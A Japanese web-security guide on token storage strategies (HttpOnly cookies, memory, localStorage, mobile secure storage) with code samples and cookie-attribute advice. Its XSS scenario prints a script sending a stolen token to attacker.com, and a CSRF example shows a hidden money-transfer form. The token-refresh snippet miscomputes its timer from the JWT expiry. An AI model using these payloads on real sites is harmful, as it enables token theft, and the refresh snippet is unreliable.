# トークンストレージ戦略

## トークン保管場所の評価

### 比較マトリックス

| 保管場所 | XSS耐性 | CSRF耐性 | 永続性 | クロスタブ | サーバーアクセス | 推奨度 |
|---------|--------|---------|--------|-----------|-------------|-------|
| **HttpOnly Cookie** | ✅ 高 | ⚠️ 要対策 | ✅ あり | ✅ 共有 | ✅ 可能 | ⭐⭐⭐⭐⭐ |
| **Memory（変数）** | ✅ 高 | ✅ 高 | ❌ なし | ❌ 不可 | ❌ 不可 | ⭐⭐⭐⭐ |
| **sessionStorage** | ❌ 低 | ✅ 高 | ⚠️ タブのみ | ❌ 不可 | ❌ 不可 | ⭐⭐ |
| **localStorage** | ❌ 低 | ✅ 高 | ✅ あり | ✅ 共有 | ❌ 不可 | ⭐ |

## 推奨ストレージ戦略

### サーバーサイドアプリケーション（SSR/SSG）

**推奨**: HttpOnly Cookie + Secure + SameSite

**実装**:
```typescript
// トークン保存
export async function setAuthCookie(accessToken: string, refreshToken: string) {
  cookies().set('access_token', accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 3600, // 1時間
    path: '/',
  });

  cookies().set('refresh_token', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 30 * 24 * 3600, // 30日
    path: '/api/auth/refresh',
  });
}
```

**メリット**:
- ✅ XSS攻撃からトークンを保護（JavaScript経由でアクセス不可）
- ✅ サーバーサイドでトークン検証可能
- ✅ ブラウザ再起動後もセッション維持

**デメリット**:
- ⚠️ CSRF対策が必要（SameSite属性 + CSRFトークン）
- ⚠️ クロスドメインリクエストで制約（SameSite=Strict時）

**CSRF対策**:
```typescript
// SameSite属性設定
sameSite: 'lax' // トップレベルナビゲーションは許可
// または
sameSite: 'strict' // 最高のCSRF保護、クロスサイトリンク制限

// 追加: CSRFトークン検証（state変更操作）
if (request.method !== 'GET') {
  verifyCsrfToken(request);
}
```

### シングルページアプリケーション（SPA）

**推奨**: Memory（変数） + 自動リフレッシュ

**実装**:
```typescript
class TokenManager {
  private accessToken: string | null = null;
  private refreshToken: string | null = null;

  setTokens(access: string, refresh: string): void {
    this.accessToken = access;
    this.refreshToken = refresh;
    this.scheduleTokenRefresh();
  }

  getAccessToken(): string | null {
    return this.accessToken;
  }

  private scheduleTokenRefresh(): void {
    // トークン有効期限の90%で自動更新
    const expiresIn = parseJWT(this.accessToken!).exp;
    const refreshAt = expiresIn * 0.9;
    setTimeout(() => this.refreshAccessToken(), refreshAt);
  }
}
```

**メリット**:
- ✅ XSS攻撃に対してHttpOnly Cookieと同等の保護（適切な実装時）
- ✅ CSRF攻撃リスクなし
- ✅ クロスドメインリクエストで制約なし

**デメリット**:
- ❌ タブ/ブラウザクローズでトークン消失（ユーザーは再ログイン）
- ❌ クロスタブ共有不可
- ❌ ページリロードでトークン消失（リフレッシュトークンで復旧）

**トークン復旧パターン**:
```typescript
// ページロード時
async function initializeApp(): Promise<void> {
  const tokenManager = new TokenManager();

  // リフレッシュトークンをHttpOnly Cookieから取得（サーバー経由）
  const tokens = await fetch('/api/auth/session').then(res => res.json());

  if (tokens.accessToken) {
    tokenManager.setTokens(tokens.accessToken, tokens.refreshToken);
  } else {
    // トークンなし → ログインページへリダイレクト
    window.location.href = '/login';
  }
}
```

### モバイルアプリケーション

**推奨**: Secure Storage（Keychain/KeyStore）

**iOS（Keychain）**:
```swift
import Security

func saveToken(_ token: String, forKey key: String) {
    let data = token.data(using: .utf8)!
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecValueData as String: data,
        kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlock
    ]
    SecItemAdd(query as CFDictionary, nil)
}
```

**Android（KeyStore）**:
```kotlin
import androidx.security.crypto.EncryptedSharedPreferences

val encryptedPrefs = EncryptedSharedPreferences.create(
    "auth_tokens",
    masterKey,
    context,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)

encryptedPrefs.edit()
    .putString("access_token", accessToken)
    .apply()
```

**メリット**:
- ✅ OS提供の暗号化ストレージ
- ✅ アプリアンインストール時に自動削除
- ✅ ルート化/脱獄デバイスでも一定の保護

## トークンタイプ別戦略

### Access Token（アクセストークン）

**特性**:
- 短命（15分-1時間）
- API呼び出しで頻繁に使用
- 漏洩リスクが最も高い

**推奨ストレージ**:
- サーバーサイド: HttpOnly Cookie
- SPA: Memory（変数）
- モバイル: Memory（変数）

**セキュリティ対策**:
- 有効期限を短く設定（1時間以下推奨）
- HTTPS通信必須
- Authorization Headerで送信（URLパラメータ禁止）

### Refresh Token（リフレッシュトークン）

**特性**:
- 長命（30日-90日）
- 新しいアクセストークン取得にのみ使用
- 漏洩時の影響が大きい

**推奨ストレージ**:
- サーバーサイド: HttpOnly Cookie（path=/api/auth/refresh）
- SPA: HttpOnly Cookie（サーバー経由で取得）
- モバイル: Secure Storage（Keychain/KeyStore）

**セキュリティ対策**:
- リフレッシュトークンローテーション実装
- 再利用検出と全トークン無効化
- デバイス/IPアドレス変更検出
- サーバー側ブラックリスト管理

### ID Token（IDトークン）

**特性**:
- ユーザー情報を含むJWT
- 認証確認用（APIアクセスには使用しない）
- 署名検証が必要

**推奨ストレージ**:
- サーバーサイド: HttpOnly Cookie
- SPA: Memory（必要に応じてデコードして使用）
- モバイル: Memory

**セキュリティ対策**:
- 署名検証必須（JWTライブラリ使用）
- 有効期限チェック
- Issuer（発行者）検証
- Audience（対象者）検証

## ストレージ実装パターン

### Pattern 1: HttpOnly Cookie（推奨）

**実装**:
```typescript
// Next.js App Router
import { cookies } from 'next/headers';

export async function storeTokens(tokens: TokenResponse): Promise<void> {
  cookies().set('access_token', tokens.access_token, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: tokens.expires_in,
    path: '/',
  });

  if (tokens.refresh_token) {
    cookies().set('refresh_token', tokens.refresh_token, {
      httpOnly: true,
      secure: true,
      sameSite: 'lax',
      maxAge: 30 * 24 * 3600,
      path: '/api/auth/refresh',
    });
  }
}
```

**取得**:
```typescript
export function getAccessToken(): string | undefined {
  return cookies().get('access_token')?.value;
}
```

### Pattern 2: Memory（SPA向け）

**実装**:
```typescript
class InMemoryTokenStore {
  private static instance: InMemoryTokenStore;
  private tokens: Map<string, string> = new Map();

  private constructor() {}

  static getInstance(): InMemoryTokenStore {
    if (!InMemoryTokenStore.instance) {
      InMemoryTokenStore.instance = new InMemoryTokenStore();
    }
    return InMemoryTokenStore.instance;
  }

  setAccessToken(token: string): void {
    this.tokens.set('access', token);
  }

  getAccessToken(): string | null {
    return this.tokens.get('access') || null;
  }

  clear(): void {
    this.tokens.clear();
  }
}
```

**使用**:
```typescript
const store = InMemoryTokenStore.getInstance();
store.setAccessToken(response.access_token);

// API呼び出し時
const token = store.getAccessToken();
```

### Pattern 3: Encrypted Storage（モバイル向け）

**React Native例**:
```typescript
import * as SecureStore from 'expo-secure-store';

export async function saveToken(key: string, value: string): Promise<void> {
  await SecureStore.setItemAsync(key, value, {
    keychainAccessible: SecureStore.AFTER_FIRST_UNLOCK,
  });
}

export async function getToken(key: string): Promise<string | null> {
  return await SecureStore.getItemAsync(key);
}

export async function deleteToken(key: string): Promise<void> {
  await SecureStore.deleteItemAsync(key);
}
```

## Cookie属性の詳細

### Secure属性

**効果**: HTTPSでのみCookieを送信

**設定**:
```typescript
secure: process.env.NODE_ENV === 'production'
```

**判断基準**:
- 本番環境: 必須（true）
- 開発環境: HTTPS使用時のみtrue

### HttpOnly属性

**効果**: JavaScriptからCookieへのアクセスを禁止

**設定**:
```typescript
httpOnly: true // 常にtrue推奨
```

**メリット**: XSS攻撃からトークンを保護

### SameSite属性

**オプション**:
- **Strict**: 最高のCSRF保護、クロスサイトリンク動作制限
- **Lax**: バランス型、トップレベルナビゲーションは許可
- **None**: クロスサイト送信必須の場合（Secure必須）

**選択基準**:
```typescript
// 一般的なWebアプリ
sameSite: 'lax' // 推奨

// 高セキュリティアプリ
sameSite: 'strict'

// 外部サイトからのAPI呼び出しを許可
sameSite: 'none' // secure: true も必須
```

### Path属性

**効果**: Cookieの送信先パスを制限

**設定例**:
```typescript
// アクセストークン: すべてのパスで使用可能
path: '/'

// リフレッシュトークン: /api/auth/refreshのみ
path: '/api/auth/refresh'
```

**メリット**: 最小権限の原則に従った制限

### Domain属性

**効果**: Cookieの送信先ドメインを制限

**設定例**:
```typescript
// サブドメイン間で共有しない
domain: undefined // デフォルト: 現在のドメインのみ

// サブドメイン間で共有
domain: '.example.com' // *.example.comすべてに送信
```

**判断基準**:
- サブドメインごとに独立した認証が必要 → domain未設定
- サブドメイン間でセッション共有が必要 → domain設定

## セキュリティシナリオ分析

### シナリオ1: XSS攻撃

**攻撃**:
```javascript
// 攻撃者が注入したスクリプト
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));
</script>
```

**防御策の効果**:
- ❌ localStorage: トークン窃取される
- ❌ sessionStorage: トークン窃取される
- ✅ HttpOnly Cookie: JavaScriptからアクセス不可 → 保護される
- ✅ Memory: ページ外からアクセス不可 → 保護される

### シナリオ2: CSRF攻撃

**攻撃**:
```html
<!-- 攻撃者のサイト -->
<form action="https://victim.com/api/transfer" method="POST">
  <input name="amount" value="1000000">
  <input name="to" value="attacker_account">
</form>
<script>document.forms[0].submit();</script>
```

**防御策の効果**:
- ⚠️ HttpOnly Cookie: Cookie自動送信される → CSRF対策必要
  - ✅ SameSite=Strict/Lax で防御
  - ✅ CSRFトークン検証で防御
- ✅ Memory/localStorage: 自動送信されない → CSRF影響なし

### シナリオ3: トークン漏洩後の影響

**アクセストークン漏洩**:
- 影響範囲: スコープ内のリソースアクセス
- 影響期間: 有効期限まで（15分-1時間）
- 対策: 短い有効期限設定、異常アクティビティ検出

**リフレッシュトークン漏洩**:
- 影響範囲: 新しいアクセストークン無制限発行
- 影響期間: リフレッシュトークン有効期限まで（30日-90日）
- 対策: リフレッシュトークンローテーション、再利用検出、即座無効化

## 実装推奨パターン

### パターンA: サーバーサイドアプリ（Next.js SSR）

**構成**:
```
Client Browser             Next.js Server           OAuth Provider
     │                          │                          │
     │  1. Login Button Click   │                          │
     ├─────────────────────────>│                          │
     │                          │  2. Redirect to Provider │
     │                          ├─────────────────────────>│
     │  3. Redirect with code   │                          │
     │<──────────────────────────────────────────────────-┤
     │  4. Submit code          │                          │
     ├─────────────────────────>│  5. Exchange code        │
     │                          ├─────────────────────────>│
     │                          │  6. Access + Refresh Token│
     │                          │<─────────────────────────┤
     │  7. Set HttpOnly Cookie  │                          │
     │<─────────────────────────┤                          │
```

**トークンフロー**:
- アクセストークン: HttpOnly Cookie（全パス）
- リフレッシュトークン: HttpOnly Cookie（/api/auth/refresh）
- クライアント側はトークンを直接扱わない

### パターンB: SPA（React/Vue）

**構成**:
```
Client Browser (SPA)       BFF (Backend for Frontend)    OAuth Provider
     │                          │                              │
     │  1. Login               │                              │
     │─────────────────────────>│  2. Redirect                │
     │                          ├─────────────────────────────>│
     │  3. Callback with code  │                              │
     │─────────────────────────>│  4. Exchange code           │
     │                          ├─────────────────────────────>│
     │                          │  5. Tokens                  │
     │  6. Tokens in response  │<─────────────────────────────┤
     │<─────────────────────────┤                              │
     │  7. Store in Memory     │                              │
```

**トークンフロー**:
- アクセストークン: Memory（変数）
- リフレッシュトークン: HttpOnly Cookie（BFFサーバー管理）
- SPAはアクセストークンのみ扱う

**リフレッシュフロー**:
```typescript
async function refreshAccessToken(): Promise<string> {
  // リフレッシュトークンはHttpOnly Cookieで自動送信
  const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include', // Cookie送信
  });

  const { access_token } = await response.json();

  // 新しいアクセストークンをMemoryに保存
  tokenManager.setAccessToken(access_token);

  return access_token;
}
```

## ベストプラクティスまとめ

### 一般原則
1. **XSS対策を最優先**: localStorage/sessionStorage使用禁止
2. **HttpOnly Cookie推奨**: サーバーサイドアプリで最適
3. **Memory使用**: SPAで次善策、タブクローズ時の再認証必要
4. **Secure Storage**: モバイルアプリではOS提供の暗号化ストレージ使用

### アプリケーションタイプ別推奨

| アプリタイプ | アクセストークン | リフレッシュトークン |
|------------|----------------|------------------|
| サーバーサイド（SSR） | HttpOnly Cookie | HttpOnly Cookie |
| SPA | Memory | HttpOnly Cookie（BFF経由） |
| モバイル（Native） | Memory | Secure Storage |
| ハイブリッド（Electron等） | Secure Storage | Secure Storage |

### Cookie属性推奨設定

```typescript
const cookieOptions = {
  httpOnly: true,              // 必須
  secure: true,                // 本番必須
  sameSite: 'lax' as const,    // CSRF対策
  path: '/',                   // スコープ
  maxAge: 3600,                // 有効期限（秒）
};
```

## 参考資料

- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OAuth 2.0 Security Best Current Practice](https://tools.ietf.org/html/draft-ietf-oauth-security-topics)
- [RFC 6749: OAuth 2.0](https://tools.ietf.org/html/rfc6749)
